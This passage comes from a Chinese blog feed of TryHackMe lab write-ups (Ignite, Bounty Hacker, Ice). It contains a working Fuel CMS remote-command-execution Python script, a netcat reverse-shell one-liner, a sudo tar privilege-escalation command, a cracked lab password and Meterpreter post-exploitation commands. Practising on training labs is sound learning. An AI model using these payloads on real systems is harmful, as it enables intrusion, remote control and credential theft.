src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111920.png" alt="image-20240401141537549"></p><p>然后这个就是网站管理员名字</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261121792.png" alt="image-20240401141635748"></p><p>圈起来的是用户名</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261121991.png" alt="image-20240401141805357"></p><p>圈起来的是密码</p><p>然后我一开始想直接有个login或者admin的后缀就能进行登录，但都没成功，然后又进行目录扫描</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261121852.png" alt="image-20240401142842547"></p><p>也没找到有用的</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111448.png" alt="image-20240401142951868"></p><p>百度搜索到管理界面</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261121465.png" alt="image-20240401143022133"></p><p>成功进入登陆界面</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261122888.png" alt="image-20240401143124670"></p><p>在左下角找到版本号</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111690.png" alt="image-20240401143214397"></p><p>然后只找到一个3.7.0的漏洞</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111687.png" alt="image-20240401144734808"></p><p>用msfconsole看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111691.png" alt="image-20240401144914435"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111694.png" alt="image-20240401145130159"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111701.png" alt="image-20240401145239473"></p><p>成功进入</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406261111864.png" alt="image-20240401145418726"></p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY6-ignite</title>
    <link href="/2024/06/20/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY6-ignite/"/>
    <url>/2024/06/20/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY6-ignite/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY6-ignite"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY6-ignite" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY6-ignite"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY6-ignite</h1><p><a href="https://tryhackme.com/r/room/ignite">尝试黑客 |点燃 — TryHackMe | Ignite</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916919.png" alt="image-20240330115635903"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916929.png" alt="image-20240330121809629"></p><p>只有80端口开启了服务</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916928.png" alt="image-20240330122016345"></p><p>对它进行目录扫描</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916932.png" alt="image-20240330121942818"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916938.png" alt="image-20240330120154101"></p><p>打开网站，发现一个Fuel CMS</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916936.png" alt="image-20240330122319877"></p><p>访问robots.txt中的页面来到这里</p><p>弱口令admin，admin直接进去了</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916591.png" alt="image-20240330123045149"></p><p>然后我们查查看这个CMS有没有爆出来的漏洞</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916710.png" alt="image-20240330123346313"></p><p>找到三个1.4.1的漏洞</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916090.png" alt="image-20240330123640015"></p><p>这里我们先试试第一个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916252.png" alt="image-20240330123848266"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><br>url = <span class="hljs-string">&quot;http://&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_nth_overlapping</span>(<span class="hljs-params">haystack, needle, n</span>):<br>    start = haystack.find(needle)<br>    <span class="hljs-keyword">while</span> start &gt;= <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> n &gt; <span class="hljs-number">1</span>:<br>        start = haystack.find(needle, start+<span class="hljs-number">1</span>)<br>        n -= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> start<br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>xxxx = raw_input(<span class="hljs-string">&#x27;cmd:&#x27;</span>)<br>burp0_url = url+<span class="hljs-string">&quot;/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27&quot;</span>+urllib.quote(xxxx)+<span class="hljs-string">&quot;%27%29%2b%27&quot;</span><br>r = requests.get(burp0_url)<br><br>html = <span class="hljs-string">&quot;&lt;!DOCTYPE html&gt;&quot;</span><br>htmlcharset = r.text.find(html)<br><br>begin = r.text[<span class="hljs-number">0</span>:<span class="hljs-number">20</span>]<br>dup = find_nth_overlapping(r.text,begin,<span class="hljs-number">2</span>)<br><br><span class="hljs-built_in">print</span>(r.text[<span class="hljs-number">0</span>:dup])<br></code></pre></td></tr></table></figure><p>他原本的代码会有一点问题，以上是修改好的（第四行url自己填，还有就是要用python2运行，不然会报错）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916210.png" alt="image-20240330223859975"></p><p>成功进入，就是有点奇怪</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916692.png" alt="image-20240330224016522"></p><p>输入这个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> fuel/application/config/database.php<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916578.png" alt="image-20240330224110421"></p><p>我们得到这个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916087.png" alt="image-20240330224844175"></p><p>艰难找了半天得到flag</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916205.png" alt="image-20240330234831233"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> /tmp/f ; <span class="hljs-built_in">mkfifo</span> /tmp/f ; <span class="hljs-built_in">cat</span> /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.2.127.38 7777 &gt;/tmp/f<br></code></pre></td></tr></table></figure><p>这个一定最好用最快捷，改个ip地址跟端口就行</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916837.png" alt="image-20240330234841467"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p>再输入这个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916242.png" alt="image-20240330235257991"></p><p>就有了用户标识</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916619.png" alt="image-20240330235357041"></p><p>用我们刚才找到的密码直接提权</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406201916803.png" alt="image-20240330235505735"></p><p>拿到root.txt</p><p><a href="https://unicornsec.com/home/tryhackme-ignite">tryhackme - 点燃 — 独角兽sec — tryhackme - ignite — unicornsec</a></p><p>参考这个wp</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY5-Bounty Hacker</title>
    <link href="/2024/06/19/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY5-Bounty-Hacker/"/>
    <url>/2024/06/19/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY5-Bounty-Hacker/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY5-Bounty-Hacker"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY5-Bounty-Hacker" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY5-Bounty Hacker"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY5-Bounty Hacker</h1><p><a href="https://tryhackme.com/r/room/cowboyhacker">尝试黑客 |赏金黑客 — TryHackMe | Bounty Hacker</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155462.png" alt="image-20240328143901896"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155504.png" alt="image-20240328172207156"></p><p>一开始扫描扫到了21，22，80三个端口（耗时太长，先不等了），分别对应FTP,SSH,HTTP这三种服务</p><p>这里我们尝试采用匿名访问漏洞去进行检测，成功发现以下文件</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155499.png" alt="image-20240328172136513"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155514.png" alt="image-20240328173140260"></p><p>把他们获取下来</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155501.png" alt="image-20240328173220542"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155508.png" alt="image-20240328173309373"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155929.png" alt="image-20240328173339245"></p><p>这里我们看到这台主机可能的用户名lin，还有疑似的密码，于是下一步自然而然想到hydra爆破连接ssh</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155965.png" alt="image-20240328173850094"></p><p>成功拿到pwd</p><p>RedDr4gonSynd1cat3</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155005.png" alt="image-20240328173954499"></p><p>成功连上目标主机</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155069.png" alt="image-20240328174115772"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155105.png" alt="image-20240328174538368"></p><p>这里出现了提权失败的问题</p><p><a href="https://gtfobins.github.io/gtfobins/tar/#sudo">采取 |go away垃圾箱 — tar | GTFOBins</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo tar -cf /dev/<span class="hljs-literal">null</span> /dev/<span class="hljs-literal">null</span> <span class="hljs-attribute">--checkpoint</span>=1 <span class="hljs-attribute">--checkpoint-action</span>=exec=/bin/sh<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155140.png" alt="image-20240328182652738"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155246.png" alt="image-20240328173515257"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406192155341.png" alt="image-20240328182801554"></p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY4-ICE</title>
    <link href="/2024/06/18/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY4-ICE/"/>
    <url>/2024/06/18/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY4-ICE/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY5-ICE"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY5-ICE" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY5-ICE"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY5-ICE</h1><p><a href="https://tryhackme.com/r/room/ice">TryHackMe的 |冰 — TryHackMe | Ice</a></p><p><a href="https://icecast.org/">Icecast</a></p><h2 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h2><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>连接openvpn</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h2 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h2><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181809673.png" alt="image-20240320232436077"></p><p>第一个问题，SYN扫描就是</p><p>-sS</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810766.png" alt="image-20240320232804490"></p><p>第二个问题，远程连接的端口是3389</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810205.png" alt="image"></p><p>（这里我的nmap扫描太慢了，拿别人成果顶一下先）</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><h2 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h2><h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810002.png" alt="image-20240320233000195"></p><p>问题一二</p><p><a href="https://www.cvedetails.com/cve/CVE-2004-1561/">CVE-2004-1561：Icecast 2.0.1 及更早版本中的缓冲区溢出允许远程攻击者通过 HTTP 请求执行任意代码 — CVE-2004-1561 : Buffer overflow in Icecast 2.0.1 and earlier allows remote attackers to execute arbitrary code via an HTTP request with (cvedetails.com)</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810663.png" alt="image-20240320234356537"></p><p>就这一个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810587.png" alt="image-20240320234553484"></p><p>显然RHOSTS需要填充数据</p><p>这里还需要注意，监听ip要改为openvpn的ip，也可以在kali使用ifconfig，tun0就是我们的LHOST</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810508.png" alt="image-20240320235047784"></p><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><h2 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h2><h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810351.png" alt="image-20240320235119524"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810731.png" alt="image-20240320235138552"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810915.png" alt="image-20240320235151857"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810783.png" alt="image-20240320235247853"></p><p>问题一二的答案</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810611.png" alt="image-20240320235339341"></p><p>三四（7601，x64）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181810404.png" alt="image-20240320235940490"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811316.png" alt="image-20240321000619999"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811134.png" alt="image-20240321000435164"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811363.png" alt="image-20240321000550128"></p><p>（我这里Lhost打错了，我后面改了就不截图了）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811080.png" alt="image-20240321000901035"></p><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>什么时候用run什么时候用exploit，getprivs</p><h2 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h2><h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811553.png" alt="image-20240321001220381"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811337.png" alt="image-20240321001242083"></p><p>spoolsv.exe</p><p>这个就是打印机</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811985.png" alt="image-20240321002331346"></p><p>也可以migrate 1260(spoolsv.exe的pid)</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811740.png" alt="image-20240321002444943"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811844.png" alt="image-20240321002515517"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811688.png" alt="image-20240321002556604"></p><h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><h2 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811647.png" alt="image-20240321002644127"></p><h3 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h3><p><em><strong>Post-Exploitation</strong></em>：主要指攻陷目标网络中的某一台或者多台主机之后需要继续去做的一些事情，包括但不限于–识别已经拿下的主机的价值以及维持访问权限；主机对于攻击者来说是否具有一定的价值、具有多大的价值主要从以下两个方面考虑–一方面在于该主机中是否有敏感信息、数据，另外一方面在于该主机是否能够在后期的渗透中发挥辅助价值-比如被攻陷的主机账户是否属于目标组织中的关键人物、高层领导、系统管理员，被攻陷的主机是否能够尽可能的有目标内网的不同网段的访问权限等等。</p><p><strong>答题</strong></p><p>正如我们在上一小节中所提及的那样-我们可以使用 <code>hashdump</code>命令来转储用户的hash值，然后再进行hash密码破解操作。（我们可以使用<code>help</code>命令，然后从帮助菜单中查看到hashdump的具体用途）</p><p><a href="https://img2023.cnblogs.com/blog/2857591/202303/2857591-20230313175233338-826144842.png"><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811163.png" alt="image"></a></p><p>通过使用<code>help</code>命令并查看帮助菜单，我们得知<code>screenshare</code>命令可用于实时查看远程用户的桌面：</p><p><a href="https://img2023.cnblogs.com/blog/2857591/202303/2857591-20230313175253347-204506380.png"><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811219.png" alt="image"></a></p><p>通过使用<code>help</code>命令并查看帮助菜单，我们得知<code>record_mic</code>命令可用于连接到系统的麦克风录音（下图中的webcams-含义是网络摄像头）：</p><p><a href="https://img2023.cnblogs.com/blog/2857591/202303/2857591-20230313175311759-1873950824.png"><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811829.png" alt="image"></a></p><p>通过使用<code>help</code>命令并查看帮助菜单，我们得知<code>record_mic</code>命令可用于修改系统上文件的时间戳：</p><p><a href="https://img2023.cnblogs.com/blog/2857591/202303/2857591-20230313175329253-710506700.png"><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811209.png" alt="image"></a></p><p>通过使用<code>help</code>命令并查看帮助菜单，我们得知<code>golden_ticket_create</code>命令可用于创建黄金票据：</p><p><a href="https://img2023.cnblogs.com/blog/2857591/202303/2857591-20230313175348463-1858698551.png"><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811543.png" alt="image"></a></p><p><a href="https://img2023.cnblogs.com/blog/2857591/202303/2857591-20230313175406092-1903750654.png"><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406181811152.png" alt="image"></a></p><blockquote><p>在msf中启用远程桌面 (MSRDP) 模块的命令： run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</p></blockquote><p>这里内容都一样，就直接把别人的复制过来了，参考链接：</p><p><a href="https://www.cnblogs.com/Hekeats-L/p/17212354.html">【THM】Ice-练习 - Hekeatsll - 博客园 (cnblogs.com)</a></p><h3 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">Core Commands</span><br><span class="hljs-section">=============</span><br><br><span class="hljs-code">    Command       Description</span><br><span class="hljs-code">    -------       -----------</span><br><span class="hljs-code">    ?             Help menu</span><br><span class="hljs-code">    background    Backgrounds the current session</span><br><span class="hljs-code">    bg            Alias for background</span><br><span class="hljs-code">    bgkill        Kills a background meterpreter script</span><br><span class="hljs-code">    bglist        Lists running background scripts</span><br><span class="hljs-code">    bgrun         Executes a meterpreter script as a background thread</span><br><span class="hljs-code">    channel       Displays information or control active channels</span><br><span class="hljs-code">    close         Closes a channel</span><br><span class="hljs-code">    detach        Detach the meterpreter session (for http/https)</span><br><span class="hljs-code">    disable_unic  Disables encoding of unicode strings</span><br><span class="hljs-code">    ode_encoding</span><br><span class="hljs-code">    enable_unico  Enables encoding of unicode strings</span><br><span class="hljs-code">    de_encoding</span><br><span class="hljs-code">    exit          Terminate the meterpreter session</span><br><span class="hljs-code">    get_timeouts  Get the current session timeout values</span><br><span class="hljs-code">    guid          Get the session GUID</span><br><span class="hljs-code">    help          Help menu</span><br><span class="hljs-code">    info          Displays information about a Post module</span><br><span class="hljs-code">    irb           Open an interactive Ruby shell on the current session</span><br><span class="hljs-code">    load          Load one or more meterpreter extensions</span><br><span class="hljs-code">    machine_id    Get the MSF ID of the machine attached to the session</span><br><span class="hljs-code">    migrate       Migrate the server to another process</span><br><span class="hljs-code">    pivot         Manage pivot listeners</span><br><span class="hljs-code">    pry           Open the Pry debugger on the current session</span><br><span class="hljs-code">    quit          Terminate the meterpreter session</span><br><span class="hljs-code">    read          Reads data from a channel</span><br><span class="hljs-code">    resource      Run the commands stored in a file</span><br><span class="hljs-code">    run           Executes a meterpreter script or Post module</span><br><span class="hljs-code">    secure        (Re)Negotiate TLV packet encryption on the session</span><br><span class="hljs-code">    sessions      Quickly switch to another session</span><br><span class="hljs-code">    set_timeouts  Set the current session timeout values</span><br><span 